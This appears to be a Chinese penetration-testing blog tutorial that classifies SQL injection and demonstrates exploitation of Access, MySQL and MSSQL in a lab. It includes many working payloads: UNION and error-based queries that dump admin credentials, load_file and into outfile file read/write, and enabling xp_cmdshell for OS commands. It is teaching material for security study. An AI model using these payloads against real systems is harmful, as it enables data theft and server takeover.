---
title: SQL注入分类与详解
date: 2018-08-12 20:32:31
tags:
    - 渗透
    - SQL注入
    - 漏洞
categories: 渗透测试
keywords:
description:
---
对SQL注入的大概分类总结，和一些基础的利用方法。
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sqlinjectionlogo.png)<!-- more -->
SQL注入是一种通过操纵输入来修改后台SQL语句以达到利用代码进行攻击的技术。

SQL注入产生的危害很多，比如后台用户及密码泄露、会员用户信息泄露、读写文件，甚至可以获得服务器权限。因此，SQL注入也是OWSP TOP 10的常客。

## SQL注入产生原理
攻击者能够控制发送给SQL查询的输入，并且开发者没有对这些输入进行安全检查和过滤直接组合到SQL语句，那么组合后的恶意语句就会被带入数据库执行。

## SQL注入分类
SQL注入的分类很多，不同的人也会将注入分成不同的种类，下面笔者将介绍一下常见的分类。

**注意：此文章中标点符号在页面中显示可能会转成中文的，自己测试时候语句中的标点一律使用英文输入法状态下的。**

### 根据数据库类型分类
每一种数据库都有一种注入命名方式，以下是比较常见的数据库注入方式
#### ACCESS注入
+ 数据库结构

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql001.png)

+ 判断注入
```
and 1=1
and 1=2

```
select * from product where id=1406 and 1=1  //真条件页面正常

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql002.png)

select * from product where id=1406 and 1=2  //假条件返回空

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql003.png)

```
or 1=1
or 1=2
```
select * from product where id=1406 or 1=1   //永真条件会返回数据库中全部结果

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql004.png)
select * from product where id=1406 or 1=2   //1406 or 1=2 返回id等与1406的结果

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql005.png)
具体页面怎么显示还要看代码怎么写的，实战中可能会有所不同。

```
xor 1=1
xor 1=2

逻辑异或。 如果任一操作数为NULL，则返回NULL。 对于非NULL操作数，如果奇数个操作数非零，则求值为1，否则返回0。

a XOR b 等同( a AND (NOT b) ) 或 ( (NOT a) AND b ),就是两个不能同时成立,也不能同时不成立,只成立其中一个条件
```
select * from product where id=1406 xor 1=1
a AND (NOT b)   返回空结果
(NOT a) AND b   返回id不等于1406的所有结果


select * from product where id=1406 xor 1=2
a AND (NOT b)   返回id等于1406的结果
(NOT a) AND b   返回空结果

如果过滤了=号换成“>”或“<”一个道理。
还有简单的方法就是在id参数后加特殊符号，如’ “ \ % *等一切可能使SQL语句报错的字符。

**联合查询法**
猜字段个数
```
order by 22 # 回显正确
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql006.png)
```
order by 23 # 回显错误
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql007.png)
因此存在22个字段。

说明：这里判断出来的字段是当前页面所连接的表的字段个数而非管理员表字段个数；准确的说是当前页面SQL语句查询的字段个数，例如select * from news猜出的字段数就是news表中所有字段个数，如果select id,title from news猜解出的就只有两个字段；

order by 是按照字段数据进行排序，用法为：order by 字段名，之所以能用来判断字段个数是因为，order by 1 <==> 按第一个字段排序，如果查询结果中一共22个字段order by 23就会出错。

猜表名
```
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
```
UNION是联合查询，将前后两条查询语句的结果组和到一起返回。SELECT后面的数字只是为了占位置，因为两条查询结果字段数不同的话会出错不会正常返回。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql008.png)

可以看到3和15两个字段的内容被输出到页面中，我们可以通过这两个位置继续查询我们想要的数据并显示。

猜列名并爆数据
```
UNION SELECT 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin
```
admin和password是admin表中的字段名，ACCESS数据库只能靠暴力猜解。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql009.png)

爆出所有用户
```
UNION SELECT top 1 1,2,admin,4,5,6,7,8,9,10,11,12,13,14,password,16,17,18,19,20,21,22 from admin where not id=1
```

**逐字猜解法(盲注)**
注入检测
同上面的方法一样

猜表名
```
and exists (select * from 表名)
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql010.png)

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql011.png)

猜列名
```
and exists (select 列名 from 表名)
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql012.png)

获取数据长度
```
and (select top 1 len(列名) from 表名)>5
```
and (select top 1 len(password) from admin)>16//错误
and (select top 1 len(password) from admin)>15//正常
说明password字段内容的长度是16

获取指定位数的数据
```
and (select top 1 asc(mid(列名,位置,1)) from 表名)>=97
```
mid(字符串,截取的位置,截取字符数)
asc(） //将字符转换成ascii码  方便进行比较

and (select top 1 asc(mid(admin,1,1)) from admin)>96//判断admin字段的内容第一位的ascii码值大于96   正常

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql013.png)

and (select top 1 asc(mid(admin,1,1)) from admin)>97//判断admin字段的内容第一位的ascii码值大于97   错误 说明就是97

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql014.png)

依次猜解其他位数

盲注的核心
盲注的核心其实是用字符串截取函数一位一位的截取数据，之后把截取到的数据用字符转ascii函数转换成ascii码和数字进行对比，之后将ascii码还原成字符。

#### MySQL注入
MySQL数据库结构

```
MySQL
    数据库a：
        表1：
            字段
                数据
            字段
                数据
        表2：
            字段
                数据
            字段
                数据
    数据库b：
        表1：
            字段
                数据
            字段
                数据
        表2：
            字段
                数据
            字段
                数据
    ......
    
mysql：MySQL自带的一个数据库，用于存放MySQL的一些信息，常用到的是该库下的user表，表中存放着MySQL的用户名和密码以及一些权限信息；低权限用户无法访问该表。

information_schema：MySQL5.0版本以上自带的一个数据库，用于存放所有数据库的库名、表名、字段名访问权限等信息。
information_schema.schemata存放库名的表
information_schema.tables存放表名的表
information_schema.columns存放字段名的表

下面查询信息用到的table_schema、table_name、column_name都是这三个表中的字段名。
table_schema：数据库名
table_name：表名
column_name：字段名

MySQL最高权限用户是root
```

判断注入
```
and 1=1  (and 1)
and 1=2  (and 0)

or 1=1   (or 1)
or 1=2   (or 0)

xor 1=1  (xor 1)
xor 1=2  (xor 0)

like

特殊符号：' " \ %等
```

猜字段个数
```
order by n
```

查信息
爆显位不同于ACCESS，MySQL爆显位不需要接from子句，但ACCESS要接from子句才可以。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql015.png)

可查的信息有：
```
system_user() 系统用户名
user() 用户名
current_user 当前用户名
session_user()连接数据库的用户名
database() 数据库名
version() MYSQL数据库版本
@@datadir 读取数据库路径
@@basedir MYSQL 安装路径
@@version_compile_os 操作系统
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql016.png)

查所有数据库名
```
union select group_concat(schema_name),2,3 from information_schema.schemata
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql017.png)

查表名
```
union select group_concat(table_name),2,3 from information_schema.tables where table_schema=database()
```
这里的table_schema的值是要查询数据库名，可以用：
```
双引号(单引号)引住明文
明文的16进制字符
database()函数
char(明文的ascii)
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql018.png)

查列名

```
union select group_concat(column_name),2,3 from information_schema.columns where table_name=CHAR(97, 100, 109, 105, 110)  //table_name代表要查询的表名
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql019.png)

查数据

```
union select username,password,3 from admin
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql020.png)

常见问题：
```
1.无法爆出显位，在id前面加上"-"使其报错
这个问题一般是因为返回了多条结果但是代码页面只显示了原本的一条查询结果，所以让原来的查询返回一个空就会把我们的结果显示出来了。
2.注入多个用户的数据 limit i,1
limit可以控制从指定的行显示
3.注入所有表或列，使用group_concat、concat、concat_ws函数
利用一些MySQL自带的功能函数
5.程序SQL语句中已有order by，一般程序SQL语句中的order by会在可控点之后，那么我们想要使用order by语句判断列数，就要将后面的语句注释掉(e.g. order by 10 %23)
```
小技巧：NULL填充判断列数
有时候order by 无法使用的时候，可以使用NULL填充法判断列数，攻击者可以构造payload：
```
UNION SELECT NULL,NULL,...,NULL
```
直到页面回显正确，页面回显正确的时候的NULL的个数即是列的数量，确定列的数量以后的注入方法和上面介绍的确定列数量以后的注入方法一致。


#### MSSQL注入
MSSQL数据库结构
```
MSSQL
    数据库a
        表1
            字段
                数据
            字段
                数据
        表2
            字段
                数据
            字段
                数据
    数据库b
        表1
            字段
                数据
            字段
                数据
        表2
            字段
                数据
            字段
                数据
    ......
    
    master：系统自带库，记录所有系统信息，登陆，系统设置，初始化信息，其他系统数据库及用户的信息。
    sysdatabases：系统表，保存在master库中，保存了，所有的库名,以及库的ID，和一些相关信息。对我们比较有用的字段名name表示库的名字  dbid表示库的ID   //select  *  from  master.dbo.sysdatabases  就可以查询出所有的库名
    sysobjects：系统表，每个库中都有，在数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在表中占一行。当然数据库表名也在里面的。对我们比较有用的字段名name对象名  id对象ID  xtype对象类型  uid对象所有者的用户id。对象类型(xtype)有很多，我们这里只用得到xtype='U'的值。当等于U的时候，对象名就是表名，对象ID就是表的ID值.   //select * from sqlin.dbo.sysobjects where xtype='U'  这样就可以列出sqlin库中所有的表名
    syscolumns：系统表，每个库中都有，每个表和视图中的每列在表中占一行，存储过程中的每个参数在表中也占一行。这个就是列出一个表中所有的字段列表的系统表。对我们比较有用的字段名name字段名称    id所属表ID号   colid字段ID号。其中的ID是上面我们用sysobjects得到的表的ID号。    //select * from sqlin.dbo.syscolumns where id=123456789  得到sqlin这个库中，表的ID是123456789中的所有字段列表
    
MSSQL2005及更高版本中以上系统表都变成视图了，但不影响我们的查询。
```

判断注入方法同上

猜解字段数
```
order by n   //原理同上面一样
union all select null,null,null.......    //推荐    有些特殊字段类型不能进行order by排序 即使存在也会报错
```
不能使用order by的时候使用：
```
union all select null,null,null.......
select后面加null，直到返回正常，多少个null就代表多少个字段，因为联合查询的前后结果字段数要相同，上面也有讲到。
union和select直接要加all，因为默认会有一个DISTINCT去重的操作，一些特殊字段类型可能会报错，所以要加all。
union联合查询结果的前后对应列的数据类型必须是相互兼容的，所以这里使用null占位，
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql022.png)

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql021.png)

匹配数据类型
我们想要获取信息，至少需要一个数据类型为字符串的列以便通过它来存储并返回我们想要的数据。
```
union all select 'test',null,null
union all select null,'test',null
union all select null,null,'test'
......
```
只需一次一列的使用示例字符串替换null即可，页面返回正常则当前列名支持字符串。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql023.png)

我表中第一列是int类型所以报错了，因为我开启了详细错误方便调试，所以直接把错误信息显示了出来，实战中返回的信息可能各不相同。关于报错注入在后面其他类型的注入中会讲到。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql024.png)

查询版本，当前数据库，用户等信息
```
版本：@@version
当前用户：
    system_user
    suser_sname()
    user
当前数据库:db_name()
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql025.png)

爆所有数据库
```
union all select null,name,null from master.dbo.sysdatabases
union all select null,'|'%2bname%2b'|',null from master.dbo.sysobjects where xtype='U' for xml path('')
```
利用SQL的FOR XML PATH 参数来进行字符串拼接，可以将结果拼接成一条显示，因为实战中的页面代码可能只允许显示一条并不是循环显示。
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql028.png)

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql029.png)
查询当前数据库所有表名
```
union all select null,(select top 1 name from sysobjects where xtype='U'),null
union all select null,(select '|'%2bname%2b'|' from sysobjects where xtype='U' FOR XML PATH('')),null
union all select null,(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH('')),null
```
union all select null,(select top 1 name from sysobjects where xtype='U'),null
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql026.png)
爆出表名news，在后面加条件and name!='news'就可以爆出不包含news的下一个表
union all select null,(select top 1 name from sysobjects where xtype='U' and name!='news'),null

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql027.png)

然后继续在后面加条件and name!='admin'
```
以此类推可以列举出所有的表
union all select null,(select top 1 name from sysobjects where xtype='U' and name!='news' and name!='admin'),null
```

同样也可以利用FOR XML PATH
```
union all select null,(select '|'%2bname%2b'|' from sysobjects where xtype='U' FOR XML PATH('')),null
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql030.png)

 查询字段名
 
```
union all select null,(select id from sysobjects where xtype='U' and name='admin' FOR XML PATH('')),null  //先查询表名admin的ID
union all select null,(select '|'%2bname%2b'|' from syscolumns where id=53575229 FOR XML PATH('')),null  //查询id等于53575229的字段名，53575229是上面查到的所属表的id
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql031.png)

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql032.png)

查询数据
```
union all select null,(select '|'%2busername%2b'|'%2bpassword%2b'|' from admin FOR XML PATH('')),null
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql033.png)

#### Oracle注入
不熟悉，先挖个坑。。。

### 根据注入点权限划分
#### 普通权限注入
普通权限注入是指所有使用低权限用户连接数据库的注入点，普通权限注入分为两类：
```
1.非root(sa、dba)用户
2.降权后的root、sa、dba
```
普通权限的注入点利用方法很有限，只能对数据库进行增删改查，而不具有跨库查询、文件操作等权限。

#### 高权限注入
高权限注入是指所有使用高权限用户(root、sa、dba)连接数据库的注入点。高权限的注入点利用方式很多，不仅限于增删改查，一般还具有读写文件的权限(特殊情况后面介绍)和存储扩展的调用权限。

高权限的注入点产生的危害，包括但不仅限于：
```
1.获取数据库中的数据
2.读写文件，读取文件和写shell
3.调用存储扩展获取系统权限(MSSQL)
```

影响读写文件的因素：
```
1.是否拥有file权限
2.secure_file_priv选项
```
secure_file_priv选项请参考：[MYSQL新特性限制文件写入及替代方法](http://www.ixysec.com/MYSQL%E6%96%B0%E7%89%B9%E6%80%A7%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8F%8A%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95.html)


MySQL读文件
关于获取绝对路径的方法有机会在其他文章讲解。
```
union select 1,load_file('D:\\phpStudy\\WWW\\sqlin\\sqltest.php'),3
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql035.png)

路径注意点：
```
1.路径使用\\ ，否则会被当作转义符号
2.路径使用/
3.盘符根路径下可用c:admin.txt
4.路径转换成16进制，不需要加单引号
5.char(路径ascii)
```

MySQL写文件
```
union select 1,'<?php phpinfo();?>',3 into outfile 'D:\\phpStudy\\WWW\\sqlin\\qqq.php'
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql036.png)

SQLMAP的os-shell 与 sql-shell

--sql-shell获取一个sqlShell用于执行SQL命令。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql037.png)

-–os-shell获取一个cmdShell，用于执行cmd命令，对于MSSQL该选项是调用xp..cmdshell存储扩展进行执行命令的;对于MySQL该选项是通过into outfile写入shell,然后再执行命令的,因此对于MySQL需要绝对路径

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql038.png)
对于MySQL os-shell写入的两个马儿说明：第一个是一个小马(上传文件用)；第二个是一个一句话，密码为cmd


MSSQL调用xp..cmdshell执行命令
```
;exec master..xp_cmdshell 'whoami';--
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql039.png)

可以使用如下命令来启用xp_cmdshell
```
;EXEC sp_configure 'show advanced options',1;    //允许修改高级参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;    //打开xp_cmdshell扩展
RECONFIGURE;--
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql040.png)

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql041.png)

也可以直接导出一句话木马，需要获取绝对路径。
system权限，这个权限是根据启动MSSQL服务的账户权限而定的。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql042.png)


这种直接在注入点后以;号分割多条SQL语句执行叫做  堆叠查询，这种方式为攻击者提供了更多自由和可能。
遗憾的是，并非所有数据库服务器平台都支持堆叠查询。例如，使用ASP.NET和PHP访问Microsoft SQL Server时允许堆叠查询，但如果使用Java来访问，就不允许。使用PHP访问PostgreSQL时，PHP允许堆叠查询；但如果访问MySQL，PHP不允许堆叠查询。


### 根据页面回显不同分类
#### 普通注入
  前面介绍到的那些有回显的注入，就是这里所说的普通注入，因为它们无论是以什么提交方式进行注入的，无论是什么数据库，无论执行的SQL语句是什么，它们都有一个共同的特点，那就是有正常回显。
  
#### 报错注入
报错注入是利用数据库的一些函数和特性，利用报错将想要的信息或数据夹在报错信息中显示出来。

##### MySQL报错注入
Mysql报错注入有一个限制条件：
```
echo  "<br>".mysql_error();
```
只有将SQL语句执行的错误信息打印出来才可以看到报错，所以报错注入需要程序能够打印SQL语句执行错误信息。

MySQL中能够用在报错注入的函数有：
```
count()、rand()、group by
updatexml()
extractvalue()
geometrycollection()
multipoint()
polygon()
multipolygon()
linestring()
multilinestring()
exp()
等等
```
这里我只讲前三种，其他函数的具体用法自行百度或者查询MySQL手册。

利用count()、rand()、group by报错注入

关于这三个组合就能报错的原理请看：[Mysql报错注入原理分析（count()、rand()、group by）](http://www.ixysec.com/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88count%E3%80%81rand%E3%80%81group-by%EF%BC%89.html)

payload：
```
and (select 1 from((select count(*),(concat(user(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x))a)  //查询当前数据库用户
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql065.png)

下面我们来拆分解读一下这个语句。
核心：
```
select count(*),(concat(user(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x
```
concat()是连接字符串的，将参数连接到一起
这条语句直接复制到数据库里执行就可以爆出用户名，具体原理看上面的文章。

因为and后面不能直接跟select语句，所以只能包在（）中作为子查询；又因为and后面操作数的结果只能包含一列，所以将报错语句包含在`and (select 1 from ()a)`的()中作为这条语句的子查询才能够正常报错返回结果。

查询数据库名
```
and (select 1 from(select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql066.png)

查询表名
```
and (select 1 from(select count(*),(concat((select table_name from information_schema.tables where table_schema=0x73716C696E limit 0,1),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)   //查询第一条表名
```
其实就是把查询库名的database()的地方换成又一条子查询语句来查询表名，由于concat的参数一次只接收一个结果，所以利用`limit`子句控制只显示一条。只需要更改 limit 1,1 便可显示下一条，以此类推可以遍历出所有表名。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql067.png)

查询字段名

```
and (select 1 from(select count(*),(concat((select column_name from information_schema.columns where table_name=0x61646D696E limit 0,1),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)
```
想遍历所有字段名方法同上，只需更改limit子句的值。
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql068.png)

查询数据

```
and (select 1 from(select count(*),(concat((select username from admin limit 0,1),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)  //查询数据时是从刚刚查到的表中去查，from后面直接跟表名就行了
```
查询其他字段的内容只需更改字段名，同样修改limit子句可遍历多条。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql069.png)


利用UPDATEXML函数报错注入：

```
UPDATEXML (XML_document, XPath_string, new_value);
第一个参数：XML_document是String格式，为XML文档对象的名称
第二个参数：XPath_string (Xpath格式的字符串)
第三个参数：new_value，String格式，替换查找到的符合条件的数据
```

查询信息：
```
and updatexml(0,concat(0x7c,version()),1)  //查询数据库版本
and updatexml(0,concat(0x7c,user()),1)  //查询当前数据库用户
and updatexml(0,concat(0x7c,database()),1)  //查询当前使用数据库名
因为第二个参数给的并不是标准的Xpath，所以会引发报错。
```

查询表名
```
and updatexml(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=0x73716C696E)),1)  //实战中要注意括号的嵌套。
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql070.png)

查询字段名

```
and updatexml(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name=0x61646D696E)),1)
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql071.png)

查询数据

```
and updatexml(0,concat(0x7c,(select group_concat(username) from admin)),1)   //admin是查询到的表名，username是上面查到的字段名
and updatexml(0,concat(0x7c,(select concat(username,0x7c,password) from admin limit 0,1)),1)   //利用concat()将两列内容拼接成一列显示，如果表中有多条数据需要使用limit一次遍历一条
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql072.png)

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql073.png)

利用EXTRACTVALUE函数报错注入：

payload：
```
and EXTRACTVALUE(0,concat(0x7c,version())) //查版本

and EXTRACTVALUE(0,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema = database()))) //查表名

and EXTRACTVALUE(0,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name='admin')))   //查字段名

and EXTRACTVALUE(0,concat(0x7c,(select concat(username,0x7c,password) from admin limit 0,1)))  //查数据
```

**一个问题：**
updatexml 和 EXTRACTVALUE函数都只能爆出32位数据，如果要爆出32位以后的数据，需要借助mid函数来进行字符截取从而显示32位以后的数据。
```
mid(string,start,[length])
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql074.png)

```
and EXTRACTVALUE(0,concat(0x7e,mid(concat(0x7c,(select concat(username,0x7c,password) from admin limit 1,1)),33),0x7e))
```
产生错误的语句是`concat(0x7c,(select concat(username,0x7c,password) from admin limit 1,1)`
用mid(）包起来从第33位开始显示剩余的，测试剩余的字符串有可能不会引起报错，所以在外面用concat(）又包了一层，头尾拼接了~符号，0x7c是~符号的16进制。

![](http://p3ek8hcdl.bkt.clouddn.com/image/sql/sql075.png)

##### MSSQL报错注入

待更新。。。

#### 盲注-基于布尔的盲注

待更新。。。

#### 盲注-基于时间的盲注

待更新。。。